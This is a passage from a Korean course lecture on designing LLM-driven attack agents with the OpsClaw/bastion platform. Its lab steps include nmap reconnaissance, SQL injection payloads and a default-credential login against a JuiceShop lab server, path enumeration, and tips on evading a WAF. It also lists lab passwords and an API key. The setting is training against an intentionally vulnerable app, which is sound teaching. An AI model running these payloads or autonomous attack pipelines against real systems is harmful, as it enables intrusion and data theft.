# Week 09: AI vs AI 공방전 (1) — AI 공격 에이전트 아키텍처와 LLM 기반 자동 공격

## 학습 목표
- AI 공격 에이전트의 핵심 아키텍처(계획-실행-피드백 루프)를 설계할 수 있다
- LLM(Large Language Model)을 활용한 자동 공격 파이프라인의 작동 원리를 이해한다
- bastion/OpsClaw 플랫폼을 활용하여 AI 기반 공격 에이전트를 구축하고 실행할 수 있다
- AI 공격 에이전트의 의사결정 과정(탐색, 익스플로잇 선택, 후속 행동)을 분석할 수 있다
- 프롬프트 엔지니어링을 통해 공격 에이전트의 행동을 제어하고 최적화할 수 있다
- AI 공격의 윤리적 고려사항과 통제 메커니즘을 설명할 수 있다

## 전제 조건
- 공방전 심화 과정 Week 01-08 이수 완료
- Python 프로그래밍 중급 (함수, 클래스, HTTP 요청)
- LLM API 호출 경험 (OpenAI API, Ollama 등)
- MITRE ATT&CK 프레임워크 기본 이해
- OpsClaw 플랫폼 사용 경험 (프로젝트 생성, execute-plan, dispatch)

## 실습 환경 (공통)

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 공격 기지 / Control Plane | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹 서버 (JuiceShop, Apache) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh, OpenCTI) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | GPU 추론 서버 (Ollama LLM) | Ollama API: `http://192.168.0.105:11434` |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`
**Ollama API:** `http://192.168.0.105:11434/v1` (모델: gpt-oss:120b, gemma3:12b, llama3.1:8b)

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | Part 1: AI 공격 에이전트 아키텍처 개론 | 강의 |
| 0:40-1:20 | Part 2: LLM 기반 공격 파이프라인 설계 | 강의/토론 |
| 1:20-1:30 | 휴식 | - |
| 1:30-2:10 | Part 3: bastion/OpsClaw 기반 공격 에이전트 구축 실습 | 실습 |
| 2:10-2:50 | Part 4: AI 공격 에이전트 실전 시뮬레이션 | 실습 |
| 2:50-3:00 | 휴식 | - |
| 3:00-3:20 | 윤리적 고려사항 토론 + 방어 관점 분석 | 토론 |
| 3:20-3:40 | 검증 퀴즈 + 과제 안내 | 퀴즈 |

---

## 용어 해설

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **AI 에이전트** | AI Agent | LLM을 두뇌로 하여 환경과 상호작용하며 목표를 달성하는 자율 시스템 | 자율 주행차의 운전자 |
| **ReAct** | Reasoning + Acting | LLM이 추론(Reasoning)과 행동(Acting)을 교차 반복하는 패턴 | 생각→행동→관찰의 반복 |
| **Tool Use** | 도구 사용 | LLM이 외부 도구(셸, API 등)를 호출하여 환경에 작용하는 능력 | 사람이 도구를 사용하는 것 |
| **프롬프트 주입** | Prompt Injection | LLM에 악의적 지시를 삽입하여 의도치 않은 행동을 유도 | 사회공학적 속임수 |
| **킬체인 자동화** | Kill Chain Automation | 사이버 킬체인의 각 단계를 AI가 자동으로 수행 | 공장 자동화 라인 |
| **피드백 루프** | Feedback Loop | 행동 결과를 관찰하고 다음 행동을 조정하는 반복 구조 | 시행착오 학습 |
| **멀티 에이전트** | Multi-Agent System | 여러 전문 에이전트가 협력하여 복잡한 작업을 수행 | 군사 작전의 분업 |
| **CoT** | Chain of Thought | LLM이 단계별로 추론 과정을 생성하는 기법 | 풀이 과정을 보여주는 수학 |
| **오케스트레이터** | Orchestrator | 여러 에이전트의 실행 순서와 상호작용을 관리하는 상위 시스템 | 오케스트라 지휘자 |
| **그라운딩** | Grounding | LLM의 출력을 실제 환경 정보로 검증하는 과정 | 현실 검증 |
| **어드버서리 에뮬레이션** | Adversary Emulation | 실제 공격자의 TTP를 모방하여 테스트하는 행위 | 모의 침투 훈련 |
| **자율 침투** | Autonomous Penetration | AI가 사람의 개입 없이 독립적으로 침투 테스트를 수행 | 자율 드론 정찰 |

---

# Part 1: AI 공격 에이전트 아키텍처 개론 (40분)

## 1.1 AI 에이전트의 정의와 구조

AI 에이전트란 **LLM(대규모 언어 모델)을 핵심 추론 엔진으로 사용**하여, 환경을 관찰하고 도구를 활용하며 목표를 달성하는 자율 시스템이다. 보안 공격 에이전트는 이 구조를 사이버 공격 도메인에 특화시킨 것이다.

### AI 에이전트의 핵심 구성 요소

```
+-------------------------------------------------------------+
|                    AI 공격 에이전트 아키텍처                    |
+-------------------------------------------------------------+
|                                                             |
|  +--------------+    +--------------+    +--------------+  |
|  |   시스템       |    |   추론 엔진    |    |   메모리       |  |
|  |   프롬프트     |---▶|   (LLM)      |◀--▶|   (Context)  |  |
|  |   (역할 정의)  |    |   ReAct Loop |    |   단기/장기    |  |
|  +--------------+    +------+-------+    +--------------+  |
|                             |                               |
|                    +--------▼--------+                      |
|                    |   도구 선택기     |                      |
|                    |   (Tool Router) |                      |
|                    +--------+--------+                      |
|           +----------------┼----------------+              |
|    +------▼------+  +------▼------+  +------▼------+      |
|    |  셸 실행     |  |  네트워크    |  |  파일 조작   |      |
|    |  run_command |  |  HTTP/API   |  |  read/write |      |
|    +-------------+  +-------------+  +-------------+      |
|                                                             |
|    +-------------------------------------------------+      |
|    |           피드백 루프 (Observation → Plan)        |      |
|    |   도구 실행 결과 → LLM 분석 → 다음 행동 결정      |      |
|    +-------------------------------------------------+      |
+-------------------------------------------------------------+
```

### 에이전트 패턴 비교

| 패턴 | 설명 | 적합 시나리오 | 장단점 |
|------|------|-------------|--------|
| **ReAct** | 추론→행동→관찰 반복 | 단일 목표, 순차적 작업 | 단순하지만 장기 계획 약함 |
| **Plan-and-Execute** | 전체 계획 수립 후 순차 실행 | 복잡한 다단계 공격 | 계획 품질에 의존 |
| **Reflexion** | 실행 후 자기 반성, 전략 수정 | 실패 복구가 중요한 경우 | 반복 비용 높음 |
| **Multi-Agent** | 역할별 전문 에이전트 협업 | 대규모 공방전 | 조율 복잡, 고성능 |
| **Hierarchical** | 상위 에이전트가 하위 에이전트 지휘 | OpsClaw 아키텍처와 동일 | 확장성 우수, 오버헤드 존재 |

## 1.2 사이버 보안 AI 에이전트의 역사와 발전

AI 기반 사이버 공격 자동화는 2023년 이후 급격히 발전하였다. 이 흐름을 이해하는 것이 현대 보안의 핵심이다.

### 발전 타임라인

| 시기 | 단계 | 주요 기술 | 대표 사례 |
|------|------|----------|----------|
| 2020 이전 | 규칙 기반 자동화 | 스크립트, Metasploit 자동화 | AutoSploit, scripts |
| 2021-2022 | ML 기반 취약점 탐지 | 패턴 인식, 이상 탐지 | CyberBattleSim (Microsoft) |
| 2023 | LLM 기반 에이전트 등장 | GPT-4, ReAct 패턴 | PentestGPT, HackerGPT |
| 2024 | 멀티 에이전트 공격 | 에이전트 오케스트레이션 | AutoAttacker, CIPHER |
| 2025 | 자율 공방전 시스템 | RL + LLM 하이브리드 | OpsClaw, bastion |
| 2026 | 계층적 자율 보안 | 분산 에이전트, PoW 검증 | OpsClaw Purple Team |

### 전통적 침투 테스트 vs AI 에이전트 비교

| 비교 항목 | 전통적 침투 테스트 | AI 에이전트 침투 테스트 |
|----------|------------------|---------------------|
| **실행 주체** | 사람 (펜테스터) | LLM + 도구 체인 |
| **속도** | 수일~수주 | 수분~수시간 |
| **커버리지** | 경험 기반, 편향 가능 | 체계적, 누락 적음 |
| **적응력** | 높음 (직감, 창의성) | 중간 (학습 데이터 의존) |
| **비용** | 고비용 (전문 인력) | 저비용 (API 과금) |
| **재현성** | 낮음 (사람마다 다름) | 높음 (동일 프롬프트 → 유사 결과) |
| **증적 관리** | 수동 기록 | 자동 기록 (PoW, evidence) |
| **윤리/법적 통제** | 계약서, 범위 합의 | 프롬프트 제한, 퍼미션 엔진 |

## 1.3 OpsClaw의 AI 에이전트 아키텍처

OpsClaw는 **계층적 멀티 에이전트 시스템**으로, AI 공격 에이전트를 안전하게 실행할 수 있는 인프라를 제공한다.

### 계층 구조

```
+--------------------------------------------------+
|  External Master (Claude Code)                    |
|  - 전략 수립, API 호출, 결과 해석                    |
|  - 자연어 → 구조화된 태스크 변환                      |
+--------------------------------------------------+
|  Manager API (:8000)                              |
|  - 프로젝트/스테이지 관리                             |
|  - 태스크 분배, Evidence 기록                        |
|  - PoW 블록 자동 생성, 보상 시스템                    |
|  - 위험도 제어 (critical → dry_run 강제)            |
+--------------------------------------------------+
|  SubAgent Runtime (:8002)         × N 서버          |
|  - 실제 명령 실행 (run_command)                      |
|  - LLM 호출 (invoke_llm, analyze)                  |
|  - 자율 미션 수행 (/a2a/mission)                    |
+--------------------------------------------------+
```

### OpsClaw vs 범용 AI 에이전트 프레임워크 비교

| 특성 | 범용 프레임워크 (LangChain 등) | OpsClaw |
|------|-------------------------------|---------|
| **대상 도메인** | 범용 | 보안 운영 특화 |
| **실행 환경** | 단일 머신 | 분산 멀티 서버 |
| **안전 메커니즘** | 기본적 | 다층 (risk_level, dry_run, 퍼미션 엔진) |
| **증적 관리** | 없거나 기본적 | PoW 블록체인 기반 불변 증적 |
| **보상 시스템** | 없음 | RL 연동 보상, Q-learning 정책 |
| **에이전트 신원** | 미식별 | agent_id 기반 개별 식별/추적 |

## 1.4 LLM 기반 공격의 위협 분류

AI 공격 에이전트가 수행할 수 있는 공격 유형을 체계적으로 분류한다.

| 공격 범주 | 설명 | ATT&CK 매핑 | 자동화 수준 |
|----------|------|-------------|-----------|
| 자동 정찰 | 대상 네트워크/서비스 자동 식별 | TA0043 Reconnaissance | 매우 높음 |
| 취약점 발견 | CVE 매칭, 퍼징, 코드 분석 | TA0001 Initial Access | 높음 |
| 익스플로잇 생성 | PoC → 실제 공격 코드 변환 | TA0002 Execution | 중간 |
| 후속 공격 | 권한 상승, 지속성, 측면 이동 | TA0004, TA0003, TA0008 | 중간 |
| 소셜 엔지니어링 | 피싱 메일/메시지 자동 생성 | T1566 Phishing | 높음 |
| 방어 회피 | 탐지 규칙 분석 후 우회 전략 수립 | TA0005 Defense Evasion | 중간~높음 |

## 1.5 공격 에이전트의 핵심 능력 요건

효과적인 AI 공격 에이전트가 갖추어야 할 핵심 능력을 정리한다.

| 능력 | 설명 | 구현 방법 |
|------|------|----------|
| **상황 인식** | 현재 환경 상태를 정확히 파악 | 정찰 도구 호출 + LLM 분석 |
| **계획 수립** | 목표 달성을 위한 다단계 계획 생성 | CoT 기반 계획 프롬프트 |
| **도구 활용** | 적절한 도구를 선택하고 올바르게 호출 | Function Calling, Tool Schema |
| **적응력** | 예상치 못한 상황에 대한 대응 | Reflexion 패턴, 에러 핸들링 |
| **은밀성** | 방어 시스템의 탐지를 회피 | 타이밍 조절, 페이로드 변형 |
| **자기 평가** | 현재 진행 상황과 성과를 판단 | 메트릭 기반 자기 평가 프롬프트 |

---

# Part 2: LLM 기반 공격 파이프라인 설계 (40분)

## 2.1 공격 에이전트의 ReAct 루프

공격 에이전트의 핵심은 **ReAct(Reasoning + Acting) 루프**이다. LLM이 현재 상황을 분석(Reasoning)하고, 적절한 도구를 선택하여 행동(Acting)하며, 결과를 관찰(Observation)하여 다음 단계를 결정한다.

### ReAct 루프 상세 흐름

```
[시스템 프롬프트: 공격 에이전트 역할 정의]
     |
     ▼
[1단계: 상황 분석 (Reasoning)]
  "대상 서버 10.20.30.80의 열린 포트를 모른다.
   정찰부터 시작해야 한다."
     |
     ▼
[2단계: 도구 선택 (Acting)]
  → run_command("nmap -sV 10.20.30.80")
     |
     ▼
[3단계: 결과 관찰 (Observation)]
  "포트 3000(Node.js), 80(Apache), 22(SSH)가 열려있다.
   JuiceShop이 3000번에서 실행 중이다."
     |
     ▼
[4단계: 다음 행동 결정 (Reasoning)]
  "JuiceShop은 OWASP 취약점 테스트용 앱이다.
   SQLi, XSS 등 웹 취약점을 시도해야 한다."
     |
     ▼
  ... (반복) ...
```

### 프롬프트 구조: 공격 에이전트용 시스템 프롬프트 설계 원칙

효과적인 공격 에이전트를 만들기 위해서는 **체계적인 시스템 프롬프트**가 필수이다.

```
+-----------------------------------------+
|       공격 에이전트 시스템 프롬프트 구조     |
+-----------------------------------------+
| 1. 역할 정의 (Role)                      |
|    "당신은 침투 테스트 전문가이다..."        |
+-----------------------------------------+
| 2. 목표 명시 (Objective)                 |
|    "대상 서버의 취약점을 발견하고 보고하라"  |
+-----------------------------------------+
| 3. 사용 가능 도구 (Tools)                |
|    run_command, fetch_log, read_file...  |
+-----------------------------------------+
| 4. 행동 규칙 (Rules)                     |
|    "파괴적 명령 금지, 데이터 유출 금지"     |
+-----------------------------------------+
| 5. 출력 형식 (Format)                    |
|    JSON 구조화된 결과 보고                 |
+-----------------------------------------+
| 6. 컨텍스트 (Context)                    |
|    인프라 정보, 이전 실행 결과              |
+-----------------------------------------+
```

### 프롬프트 계층별 상세

| 계층 | 구성 요소 | 예시 | 중요도 |
|------|----------|------|--------|
| **역할** | 전문성, 경험, 태도 | "10년 경력의 오펜시브 보안 전문가" | 높음 |
| **목표** | 최종 달성 조건 | "웹 앱의 SQLi 취약점 3개 이상 발견" | 높음 |
| **도구** | 사용 가능한 기능 목록 | run_command, curl, nmap | 높음 |
| **규칙** | 절대 금지 행위 | "rm -rf 금지, 실제 데이터 접근 금지" | 매우 높음 |
| **형식** | 출력 JSON 스키마 | `{vuln_id, severity, evidence}` | 중간 |
| **컨텍스트** | 환경 정보, 이전 결과 | 대상 IP, 이전 정찰 결과 | 높음 |

## 2.2 멀티 스텝 공격 파이프라인

단일 ReAct 루프를 넘어서, **킬체인 전 단계를 자동화**하는 멀티 스텝 파이프라인을 설계할 수 있다.

### 파이프라인 단계별 설계

| 단계 | 에이전트 역할 | 입력 | 출력 | 사용 도구 |
|------|-------------|------|------|----------|
| 1. 정찰 | Recon Agent | 대상 IP/도메인 | 열린 포트, 서비스 목록 | nmap, curl, dig |
| 2. 분석 | Analyzer Agent | 서비스 목록 | CVE 목록, 공격 벡터 | CVE DB 조회, LLM 분석 |
| 3. 익스플로잇 | Exploit Agent | 공격 벡터 | 침투 성공/실패 | curl, sqlmap, 커스텀 스크립트 |
| 4. 후속 행동 | Post-Exploit Agent | 쉘 접근 | 권한 상승, 정보 수집 | whoami, id, cat /etc/passwd |
| 5. 보고 | Reporter Agent | 전체 결과 | 구조화된 보고서 | LLM 요약 |

### 에이전트 간 데이터 흐름

```
Recon Agent ──────▶ Analyzer Agent ──────▶ Exploit Agent ──────▶ Post-Exploit
{ports, services}   {vulns, vectors}       {access_level}        {privesc, loot}
       │                   │                      │                     │
       └───────────────────┴──────────────────────┴─────────────────────┘
                            │
                     Reporter Agent
                   {structured_report}
```

### OpsClaw execute-plan으로의 매핑

```python
# 파이프라인을 OpsClaw tasks 배열로 변환하는 개념적 구조
pipeline_to_tasks = {
    "recon":        {"order": 1, "risk_level": "low"},
    "analyze":      {"order": 2, "risk_level": "low"},
    "exploit":      {"order": 3, "risk_level": "medium"},
    "post_exploit": {"order": 4, "risk_level": "high"},
    "report":       {"order": 5, "risk_level": "low"},
}
# order 순서로 실행되며, 각 단계의 결과가 evidence에 자동 기록된다
```

## 2.3 bastion 아키텍처 분석

bastion은 Claude Code의 오픈소스 구현을 분석하여 만든 **보안 운영 에이전트 프레임워크**이다. OpsClaw와 함께 사용하면 AI 공격/방어 에이전트를 효과적으로 구축할 수 있다.

### bastion의 핵심 패키지 (보안 에이전트용)

| 패키지 | 역할 | AI 공격 에이전트 활용 |
|--------|------|---------------------|
| **prompt_engine** | 시스템 프롬프트 동적 조합 | 공격 에이전트 역할 프롬프트 생성 |
| **hook_engine** | 라이프사이클 Hook 이벤트 | 공격 전/후 검증, 위험 차단 |
| **tool_validator** | Tool 입출력 검증 | 공격 명령 파라미터 검증 |
| **permission_engine** | 다층 퍼미션 통합 | 위험 명령 실행 통제 |
| **cost_tracker** | LLM 토큰/비용 추적 | 공격 시뮬레이션 비용 관리 |
| **memory_manager** | 메모리 고도화 | 공격 결과 자동 기록, 패턴 학습 |

### bastion 시스템 프롬프트 조합 예시

```python
# bastion의 prompt_engine을 활용한 공격 에이전트 프롬프트 생성
from packages.prompt_engine import compose

# 공격 에이전트용 프롬프트 생성
attack_prompt = compose("master", {
    "server": "web",            # 공격 대상 서버
    "rag_results": [            # 과거 공격 이력 참조
        {"title": "JuiceShop SQLi 공격 성공", "body": "..."},
        {"title": "Apache 디렉토리 리스팅 발견", "body": "..."},
    ],
    "local_knowledge": {
        "server": "web",
        "tools": {"run_command": True, "fetch_log": True},
    },
})
# → 약 7,800자의 맥락 인지형 시스템 프롬프트 생성
```

### hook_engine을 활용한 안전 장치

```python
# 공격 실행 전 위험도 검증 Hook 설정
from packages.hook_engine import register_hook, HookDefinition

register_hook(HookDefinition(
    event="pre_dispatch",
    hook_type="validator",
    target="risk_check",
    condition="risk_level == 'critical'",
    can_block=True,  # True면 조건 충족 시 실행 차단
))
# → critical 수준의 명령은 자동으로 차단되어 사용자 확인을 요구
```

## 2.4 공격 에이전트의 의사결정 모델

AI 공격 에이전트는 각 단계에서 **어떤 행동을 선택할지** 결정해야 한다. 이 의사결정 과정을 구조화하면 성능을 크게 향상시킬 수 있다.

### 의사결정 트리 구조

```
[현재 상태: 정찰 완료]
     |
     +- 웹 서비스 발견? --YES--▶ 웹 취약점 스캔
     |                           +- SQLi 가능? --▶ SQLi 공격
     |                           +- XSS 가능? --▶ XSS 공격
     |                           +- 디렉토리 리스팅? --▶ 정보 수집
     |
     +- SSH 열림? --YES--▶ 인증 시도
     |                     +- 기본 계정 --▶ 브루트포스
     |                     +- 키 인증 --▶ 키 파일 탐색
     |
     +- 기타 서비스? --YES--▶ 서비스별 CVE 조회
```

### 행동 선택 기준 (Scoring Model)

| 기준 | 가중치 | 설명 | 예시 |
|------|--------|------|------|
| 성공 확률 | 0.30 | 해당 공격이 성공할 추정 확률 | SQLi on JuiceShop → 0.9 |
| 탐지 위험 | 0.25 | IDS/IPS에 탐지될 가능성 (낮을수록 좋음) | nmap SYN → 0.7 (탐지 쉬움) |
| 영향도 | 0.20 | 성공 시 얻는 접근 수준 | RCE → 1.0 (최대) |
| 비용 | 0.15 | 필요한 시간과 리소스 | 브루트포스 → 0.3 (저비용) |
| 피드백 품질 | 0.10 | 실패 시에도 유용한 정보를 얻는 정도 | 에러 메시지 → 0.8 |

### 점수 계산 예시

```
공격 벡터: JuiceShop SQL Injection
  성공 확률:   0.85 × 0.30 = 0.255
  탐지 위험:   (1-0.4) × 0.25 = 0.150  (탐지 확률 40%)
  영향도:      0.70 × 0.20 = 0.140
  비용:        (1-0.2) × 0.15 = 0.120  (저비용)
  피드백:      0.90 × 0.10 = 0.090
  -------------------------
  총점: 0.755  ← 높은 우선순위

공격 벡터: SSH 브루트포스
  성공 확률:   0.20 × 0.30 = 0.060
  탐지 위험:   (1-0.9) × 0.25 = 0.025  (높은 탐지)
  영향도:      0.90 × 0.20 = 0.180
  비용:        (1-0.8) × 0.15 = 0.030  (고비용)
  피드백:      0.30 × 0.10 = 0.030
  -------------------------
  총점: 0.325  ← 낮은 우선순위
```

---

# Part 3: bastion/OpsClaw 기반 공격 에이전트 구축 실습 (40분)

## 실습 3.1: 환경 준비 및 LLM 연동 확인

> **실습 목적**: AI 공격 에이전트를 구축하기 전에 OpsClaw 플랫폼과 LLM 추론 서비스가 정상 동작하는지 확인한다.
>
> **배우는 것**: 분산 AI 에이전트 시스템의 사전 점검 절차, LLM API 호출 구조, SubAgent의 AI 기능(invoke_llm, analyze)을 이해한다.
>
> **결과 해석**: 모든 헬스 체크가 정상이면 AI 에이전트 실습 환경이 준비된 것이다. Ollama 연결 실패 시 GPU 서버 상태를 확인한다.
>
> **실전 활용**: 실제 AI 기반 레드팀 작전에서 추론 엔진의 가용성 확인은 작전 개시의 전제 조건이다.

```bash
# API 키 설정
export OPSCLAW_API_KEY=opsclaw-api-key-2026

# 1. Manager API 상태 확인
curl -s http://localhost:8000/health | python3 -m json.tool
# 예상: {"status": "ok"}
```

```bash
# 2. 전체 SubAgent 상태 확인
for host in 10.20.30.201 10.20.30.1 10.20.30.80 10.20.30.100; do
  echo "=== $host ==="
  curl -s --connect-timeout 3 http://$host:8002/health 2>/dev/null || echo "UNREACHABLE"
done
# 각 SubAgent의 상태가 "ok"로 출력되어야 한다
```

```bash
# 3. Ollama LLM 서비스 확인 (GPU 서버)
curl -s http://192.168.0.105:11434/api/tags | python3 -m json.tool | head -20
# 사용 가능한 모델 목록이 출력된다 (gemma3:12b, llama3.1:8b 등)
```

```bash
# 4. SubAgent를 통한 LLM 호출 테스트 — 프로젝트 생성
curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "name": "week09-ai-agent-test",
    "request_text": "AI 에이전트 LLM 연동 테스트",
    "master_mode": "external"
  }' | python3 -m json.tool
# 반환된 프로젝트 ID를 메모한다
```

> **명령어 해설**: `http://192.168.0.105:11434/api/tags`는 Ollama의 모델 목록 API이다. 이 API가 응답하면 LLM 추론 서비스가 정상 가동 중인 것이다. `master_mode: "external"`은 Claude Code가 오케스트레이션하는 모드를 의미한다.
>
> **트러블슈팅**: Ollama가 응답하지 않으면 GPU 서버(dgx-spark)에 SSH 접속하여 `systemctl status ollama` 또는 `ollama list`로 서비스 상태를 확인한다. GPU 메모리 부족 시 작은 모델(gemma3:12b)을 우선 사용한다.

## 실습 3.2: 단순 ReAct 공격 에이전트 구현

> **실습 목적**: OpsClaw의 execute-plan과 dispatch를 조합하여 가장 기본적인 ReAct 패턴의 공격 에이전트를 구현한다.
>
> **배우는 것**: ReAct 루프의 각 단계(추론→행동→관찰)가 OpsClaw API 호출로 어떻게 매핑되는지 이해한다. 에이전트의 자율적 의사결정 과정을 체험한다.
>
> **결과 해석**: 에이전트가 정찰 결과를 바탕으로 적절한 공격 벡터를 선택했다면 ReAct 루프가 올바르게 동작한 것이다. 무관한 명령을 실행했다면 프롬프트 개선이 필요하다.
>
> **실전 활용**: 이 패턴은 실제 자동화된 침투 테스트 도구의 기본 구조이다. 이를 기반으로 더 복잡한 멀티 스텝 에이전트를 구축할 수 있다.

```bash
# 프로젝트 ID 설정 (실습 3.1에서 생성한 것)
export PROJECT_ID="반환된-프로젝트-ID"

# Stage 전환: plan → execute (execute-plan 호출 전 필수)
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/plan \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool

curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
```

```bash
# ReAct Step 1: 정찰 (Acting)
# 대상 서버의 열린 포트와 서비스를 식별한다
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "nmap -sV -T4 -p 1-10000 10.20.30.80 2>/dev/null | grep open",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "curl -s -I http://10.20.30.80:3000 2>/dev/null | head -15",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - `nmap -sV -T4 -p 1-10000`: 서비스 버전 탐지(-sV), 공격적 타이밍(-T4), 포트 범위(1-10000) 지정
> - `grep open`: nmap 결과에서 열린 포트만 필터링하여 가독성 향상
> - `curl -s -I`: HTTP 헤더만 요청하여 서버 소프트웨어 핑거프린팅 수행
>
> **트러블슈팅**: nmap이 설치되지 않은 경우 `apt-get install nmap` 실행이 필요하다. 타임아웃 발생 시 `-T4` 대신 `-T3`으로 타이밍을 낮추거나 포트 범위를 줄인다.

```bash
# ReAct Step 2: 분석 (Reasoning) — LLM을 활용한 정찰 결과 분석
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/dispatch \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "command": "curl -s -X POST http://localhost:8002/a2a/analyze -H \"Content-Type: application/json\" -d \"{\\\"context\\\": \\\"대상: 10.20.30.80, 열린 포트: 22(SSH), 80(Apache), 3000(JuiceShop Node.js). JuiceShop은 OWASP 취약점 테스트 앱이다.\\\", \\\"question\\\": \\\"이 서버에 대해 가능한 공격 벡터를 우선순위대로 5개 나열하라. 각 벡터에 ATT&CK ID, 성공 확률(high/medium/low), 위험도를 포함하라.\\\"}\"",
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**: SubAgent의 `/a2a/analyze` 엔드포인트는 LLM에게 보안 분석을 요청하는 API이다. context에 수집된 정보를, question에 분석 요청을 전달한다. LLM은 보안 지식을 바탕으로 공격 벡터를 추천한다.
>
> **트러블슈팅**: analyze가 500 에러를 반환하면 Ollama 서비스 상태를 확인한다. 응답이 30초 이상 지연되면 더 작은 모델(gemma3:12b → llama3.1:8b)을 사용하거나 질문을 단순화한다.

```bash
# ReAct Step 3: 공격 실행 (Acting) — LLM 추천 기반 공격
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "curl -s \"http://10.20.30.80:3000/rest/products/search?q=test%27%20OR%201=1--\" | python3 -m json.tool 2>/dev/null | head -30",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"admin@juice-sh.op\\\",\\\"password\\\":\\\"admin123\\\"}\" | python3 -m json.tool 2>/dev/null | head -20",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "curl -s \"http://10.20.30.80:3000/rest/products/search?q=))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--\" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -40",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.201:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - task 1: 기본 SQL Injection 테스트 (`' OR 1=1--`)로 입력 검증 우회 시도
> - task 2: 기본 인증 정보를 사용한 로그인 시도 (크리덴셜 스터핑)
> - task 3: UNION 기반 SQL Injection으로 데이터베이스 스키마 추출 시도
>
> **트러블슈팅**: HTTP 403 응답은 WAF(BunkerWeb)가 공격을 차단한 것이다. 이 경우 인코딩 변경(더블 URL 인코딩, 유니코드), 헤더 조작(User-Agent 변경), 또는 WAF 규칙 분석 후 비차단 벡터를 탐색해야 한다.

## 실습 3.3: 멀티 스텝 자동 공격 파이프라인

> **실습 목적**: 정찰부터 보고까지 킬체인 전 과정을 하나의 execute-plan으로 자동 실행하는 5단계 파이프라인을 구축한다.
>
> **배우는 것**: execute-plan의 tasks 배열에서 order 순서에 따른 순차 실행, 서버별 SubAgent 분배, risk_level에 따른 실행 제어를 이해한다.
>
> **결과 해석**: 모든 task가 exit_code 0으로 완료되면 파이프라인이 정상 동작한 것이다. 특정 task에서 실패하면 해당 단계의 전제 조건을 재확인한다.
>
> **실전 활용**: 이 패턴은 실제 자동화 침투 테스트 프레임워크(CALDERA, Atomic Red Team)의 기본 작동 방식과 동일하다.

```bash
# 새 프로젝트 생성 — 멀티 스텝 공격 파이프라인
curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "name": "week09-attack-pipeline",
    "request_text": "킬체인 자동화: 정찰→분석→익스플로잇→후속행동→보고",
    "master_mode": "external"
  }' | python3 -m json.tool
# PROJECT_ID2로 메모
```

```bash
export PROJECT_ID2="반환된-프로젝트-ID"

# Stage 전환
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID2/plan \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID2/execute \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
```

```bash
# 5단계 자동 공격 파이프라인 실행
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID2/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"=== 1단계: 네트워크 정찰 ===\"; nmap -sV -T4 --top-ports 100 10.20.30.80 2>/dev/null | grep -E \"open|PORT\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"=== 2단계: 웹 서비스 핑거프린팅 ===\"; curl -s -I http://10.20.30.80:3000 | head -10; echo \"---\"; curl -s http://10.20.30.80:3000/api/ 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "echo \"=== 3단계: 디렉토리 탐색 ===\"; for path in /api /rest /admin /ftp /api-docs /metrics /swagger.json /robots.txt; do code=$(curl -s -o /dev/null -w \"%{http_code}\" http://10.20.30.80:3000$path 2>/dev/null); echo \"$path → HTTP $code\"; done",
        "risk_level": "low",
